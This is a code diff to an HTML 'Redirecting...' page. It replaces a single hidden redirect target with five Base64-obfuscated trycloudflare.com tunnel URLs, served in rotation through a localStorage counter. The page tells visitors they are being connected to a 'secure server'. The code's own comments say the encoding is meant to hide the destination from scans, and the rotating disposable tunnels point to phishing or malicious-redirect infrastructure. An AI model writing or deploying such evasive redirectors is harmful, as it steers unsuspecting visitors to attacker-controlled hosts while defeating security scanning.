@@ -1,38 +1,124 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirecting...</title>
-    <style>
-        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background-color: #f0f0f0; color: #333; }
-        #timer { font-size: 2em; font-weight: bold; }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Redirecting...</title>
+<style>
+body {
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+    background-color: #f5f5f5;
+    color: #333;
+}
+.redirect-container {
+    text-align: center;
+    padding: 30px;
+    background-color: white;
+    border-radius: 8px;
+    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+    max-width: 400px;
+    width: 90%;
+}
+#timer {
+    font-size: 1.8em;
+    font-weight: 600;
+    margin-bottom: 20px;
+    color: #0E72ED;
+}
+.loading-dots {
+    display: flex;
+    justify-content: center;
+    margin: 20px 0;
+}
+.dot {
+    width: 10px;
+    height: 10px;
+    margin: 0 4px;
+    background-color: #0E72ED;
+    border-radius: 50%;
+    display: inline-block;
+    animation: bounce 1.4s infinite ease-in-out both;
+}
+.dot:nth-child(1) {
+    animation-delay: -0.32s;
+}
+.dot:nth-child(2) {
+    animation-delay: -0.16s;
+}
+@keyframes bounce {
+    0%, 80%, 100% {
+        transform: scale(0);
+        opacity: 0.5;
+    }
+    40% {
+        transform: scale(1);
+        opacity: 1;
+    }
+}
+.status-message {
+    font-size: 1em;
+    color: #666;
+    margin-top: 15px;
+}
+</style>
 </head>
 <body>
+<div class="redirect-container">
     <div id="timer">Redirecting in <span id="countdown">5</span> seconds...</div>
-    <script>
-        // --- EDIT THIS LINE ---
-        // The URL is encoded in Base64 to hide it from simple scans.
-        const encodedUrl = 'aHR0cHM6Ly9zdHJpbmctcHJvbWlzZS1zZWxlY3RlZC13ZWJzaG90cy50cnljbG91ZGZsYXJlLmNvbQ==';
-        // ---------------------
+    <div class="loading-dots">
+        <span class="dot"></span>
+        <span class="dot"></span>
+        <span class="dot"></span>
+    </div>
+    <div class="status-message">Please wait while we connect you to the secure server...</div>
+</div>
 
-        const destinationUrl = atob(encodedUrl); // Decodes the Base64 string back to a normal URL
-        const delayInSeconds = 5;
-        const countdownElement = document.getElementById('countdown');
+<script>
+// Rotating URLs - encoded in Base64
+const encodedUrls = [
+    'aHR0cHM6Ly9jcml0ZXJpYS1zeW50aGV0aWMtYXZhaWxhYmlsaXR5LWRhdGUudHJ5Y2xvdWRmbGFyZS5jb20=', // https://criteria-synthetic-availability-date.trycloudflare.com
+    'aHR0cHM6Ly9yYWlkLWNhcmRpZmYtdG93YXJkLWNvbm5lY3Rpb25zLnRyeWNsb3VkZmxhcmUuY29t', // https://raid-cardiff-toward-connections.trycloudflare.com
+    'aHR0cHM6Ly9iZW5kLWludGVydmlld3MtcG9kY2FzdHMtZnJlZXdhcmUudHJ5Y2xvdWRmbGFyZS5jb20=', // https://bend-interviews-podcasts-freeware.trycloudflare.com
+    'aHR0cHM6Ly9zY2llbnRpZmljLWNvdXBsZWQtYmVnaW4tbGF5ZXIudHJ5Y2xvdWRmbGFyZS5jb20=', // https://scientific-coupled-begin-layer.trycloudflare.com
+    'aHR0cHM6Ly9jaGVhdHMtcGVyc29ucy1qdXN0aWNlLWRlY3JlYXNlLnRyeWNsb3VkZmxhcmUuY29t'  // https://cheats-persons-justice-decrease.trycloudflare.com
+];
 
-        let secondsLeft = delayInSeconds;
-        countdownElement.textContent = secondsLeft;
+// Function to get the next URL in rotation
+function getNextUrl() {
+    // Get current rotation index from localStorage, or start at 0
+    let currentIndex = parseInt(localStorage.getItem('urlRotationIndex') || '0');
+    
+    // Get the URL at current index
+    const url = encodedUrls[currentIndex];
+    
+    // Update index for next visit (wrap around if needed)
+    const nextIndex = (currentIndex + 1) % encodedUrls.length;
+    localStorage.setItem('urlRotationIndex', nextIndex.toString());
+    
+    return url;
+}
 
-        const countdownInterval = setInterval(() => {
-            secondsLeft--;
-            countdownElement.textContent = secondsLeft;
+const destinationUrl = atob(getNextUrl()); // Decodes the Base64 string back to a normal URL
+const delayInSeconds = 5;
+const countdownElement = document.getElementById('countdown');
+let secondsLeft = delayInSeconds;
 
-            if (secondsLeft <= 0) {
-                clearInterval(countdownInterval);
-                window.location.href = destinationUrl;
-            }
-        }, 1000);
-    </script>
+countdownElement.textContent = secondsLeft;
+
+const countdownInterval = setInterval(() => {
+    secondsLeft--;
+    countdownElement.textContent = secondsLeft;
+    
+    if (secondsLeft <= 0) {
+        clearInterval(countdownInterval);
+        window.location.href = destinationUrl;
+    }
+}, 1000);
+</script>
 </body>
 </html>
